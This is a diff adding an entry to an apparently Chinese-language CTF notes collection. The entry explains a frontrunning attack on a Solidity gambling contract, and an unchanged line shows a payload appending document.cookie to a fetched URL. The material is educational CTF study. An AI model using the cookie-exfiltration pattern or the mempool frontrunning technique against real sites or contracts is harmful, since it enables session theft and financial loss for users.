@@ -2429,3 +2429,21 @@ js.fetch("url" + js.document.cookie)
         r.close()
     send_mail('', input("address: ").strip())
     ```
+244. [gambling](https://github.com/Kaiziron/gpnctf2023-writeup/blob/main/gambling.md)
+- blockchain solidity [frontrunning](https://omniatech.io/pages/decoding-frontrunning-understanding-the-key-terms-and-techniques/)例题。想快速了解这种技巧可以看[视频](https://www.youtube.com/watch?v=uElOqz-Htos).个人认为frontrunning打的是信息差。一个简单的案例：假设有A和攻击者B，以及货币C，价格为1。A尝试购买C货币时被B提前得知，于是B尝试在A之前购买C货币（支付更高的gas fee从而先处理B的请求）。那么到A购买的时候，C货币的价格就涨了，比如涨到1.2。等A买完，B再卖掉，净赚1.2-1的货币差值。
+- [VRF Security Considerations](https://docs.chain.link/vrf/v2/security)(Verifiable Random Function)：Don't accept bids/bets/inputs after you have made a randomness request。此题正是违反了这条导致frontrunning。接着上一条，其实frontrunning不一定要两个人，它只是“提前知道某个信息并获利”的手段。现在有个这样逻辑的合约A：
+	- enter(num)函数：输入一个num数字，同时合约A向随机数合约B发送随机数请求
+	- 合约B返回随机数
+	- claim函数：判断num是否与合约B返回的随机数相同
+
+漏洞点在于，在发送随机数请求和返回随机数的中间，没有限制用户不能再调用enter函数。加上合约运行时的一举一动是可以在mempool里看到的，并且任何人都能从RPC provider（如[quicknode](https://www.quicknode.com/)）那里获取到mempool内容，便有了frontrunning。我们可以随便enter一个数字，在合约B返回随机数之前，提前从mempool读取到这个随机数，然后使用更高的gas fee再次enter这个正确的随机数，让oracle先处理我们这个请求。最后在第二次随机数返回前，调用claim，完成攻击。
+- 一些python web3脚本编写的基础知识。
+```py
+from web3 import Web3, HTTPProvider
+web3 = Web3(HTTPProvider('<rpc url>'))
+gambling_abi = #https://www.quicknode.com/guides/ethereum-development/smart-contracts/what-is-an-abi 。可在Remix里compile合约后获得
+gambling_contract = web3.eth.contract(address='', abi=gambling_abi)
+#wp里还包含：如何转账（transaction）
+#如何从RPC provider那里获取mempool内容
+#cast命令调用合约函数
+```
